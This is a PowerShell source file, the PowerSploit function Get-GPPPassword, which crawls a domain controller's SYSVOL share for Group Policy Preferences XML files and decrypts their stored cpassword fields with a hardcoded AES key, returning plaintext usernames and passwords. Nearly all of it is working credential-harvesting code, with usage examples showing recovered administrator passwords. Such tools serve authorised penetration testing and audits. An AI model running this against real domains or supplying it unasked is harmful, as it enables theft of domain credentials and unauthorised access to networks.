function Get-GPPPassword {
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: PowerView (Recon/PowerView.ps1)
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.PARAMETER DomainName

    The domain name(s) to query for. Defaults to the current domain.

.EXAMPLE

    PS C:\> Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
	DomainName: {DEMO.LAB}

    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
	DomainName: {DEMO.LAB}
	
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
	DomainName: {DEMO.LAB}
	
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
	DomainName: {DEMO.LAB}
	
.EXAMPLE

    PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!

.EXAMPLE

    PS C:\> "DEMO.LAB","TEST.LAB" | Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
	DomainName: {DEMO.LAB}

    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {TEST\Administrator, admin}
    File      : \\TEST.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
	DomainName: {TEST.LAB}

.EXAMPLE

    PS C:\> Invoke-MapDomainTrust | Select-Object Domain -Unique | Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
	DomainName: {DEMO.LAB}

    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {TEST\Administrator, admin}
    File      : \\TEST.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
	DomainName: {TEST.LAB}
	
	Using PowerView, attempts to retrieve all trusted domains using builtin .net methods and then attempts and retrieves GPP. Note, this would require PowerView.ps1 in memory, and will error with wrong directional trusts, certain quarantined trusts, and non-Windows trusts.
	
.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Object[]]
        $DomainName = $Env:USERDNSDOMAIN
    )
	process {
		#Some XML issues between versions
		Set-StrictMode -Version 2
		
		#define helper function that decodes and decrypts password
		function Get-DecryptedCpassword {
			[CmdletBinding()]
			Param (
				[string] $Cpassword 
			)

			try {
				#Append appropriate padding based on string length  
				$Mod = ($Cpassword.length % 4)
				
				switch ($Mod) {
				'1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
				'2' {$Cpassword += ('=' * (4 - $Mod))}
				'3' {$Cpassword += ('=' * (4 - $Mod))}
				}

				$Base64Decoded = [Convert]::FromBase64String($Cpassword)
				
				#Create a new AES .NET Crypto Object
				$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
				[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
									 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
				
				#Set IV to all nulls to prevent dynamic generation of IV value
				$AesIV = New-Object Byte[]($AesObject.IV.Length) 
				$AesObject.IV = $AesIV
				$AesObject.Key = $AesKey
				$DecryptorObject = $AesObject.CreateDecryptor() 
				[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
				
				return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
			} 
			
			catch {Write-Error $Error[0]}
		}  
		
		#define helper function to parse fields from xml files
		function Get-GPPInnerFields {
		[CmdletBinding()]
			Param (
				$File 
			)
		
			try {
				
				$Filename = Split-Path $File -Leaf
				[xml] $Xml = Get-Content ($File)

				#declare empty arrays
				$Cpassword = @()
				$UserName = @()
				$NewName = @()
				$Changed = @()
				$Password = @()
		
				#check for password field
				if ($Xml.innerxml -like "*cpassword*"){
				
					Write-Verbose "Potential password in $File"
					
					switch ($Filename) {

						'Groups.xml' {
							$Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
			
						'Services.xml' {  
							$Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
			
						'Scheduledtasks.xml' {
							$Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
			
						'DataSources.xml' { 
							$Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
						}
						
						'Printers.xml' { 
							$Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
	  
						'Drives.xml' { 
							$Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
						}
					}
			   }
						 
			   foreach ($Pass in $Cpassword) {
				   Write-Verbose "Decrypting $Pass"
				   $DecryptedPassword = Get-DecryptedCpassword $Pass
				   Write-Verbose "Decrypted a password of $DecryptedPassword"
				   #append any new passwords to array
				   $Password += , $DecryptedPassword
			   }
				
				#put [BLANK] in variables
				if (!($Password)) {$Password = '[BLANK]'}
				if (!($UserName)) {$UserName = '[BLANK]'}
				if (!($Changed)) {$Changed = '[BLANK]'}
				if (!($NewName)) {$NewName = '[BLANK]'}
					  
				#Create custom object to output results
				$XMResults = New-Object PSObject
				$XMResults | Add-Member 'Passwords' = $Password
				$XMResults | Add-Member 'UserNames' = $UserName
				$XMResults | Add-Member 'Changed' = $Changed
				$XMResults | Add-Member 'NewName' = $NewName
				$XMResults | Add-Member 'File' = $File
					
				Write-Verbose "The password is between {} and may be more than one value."
				if ($XMResults) {Return $XMResults} 
			}

			catch {Write-Error $Error[0]}
		}
		
		try {
			$GPResults = New-Object PSObject
			#ensure that machine is domain joined and script is running as a domain account
			if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
				throw 'Machine is not a domain member or User is not a member of the domain.'
			}
			Write-Verbose  "Trying on $DomainName"
			#discover potential files containing passwords ; not complaining in case of denied access to a directory
			Write-Verbose "Searching the DC for $DomainName. This could take a while."
			$XMlFiles = Get-ChildItem -Path "\\$DomainName\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
		
			if ( -not $XMlFiles ) {Write-Verbose 'No preference files found.'}

			Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
		
			foreach ($File in $XMLFiles) {
				$Result = (Get-GppInnerFields $File.Fullname)
				$GPResults = $GPResults + $Result
				$GPResults | Add-Member Noteproperty 'DomainName' $DomainName
				$GPResults
			} 
			
    }

    catch {Write-Error $Error[0]}
	}
}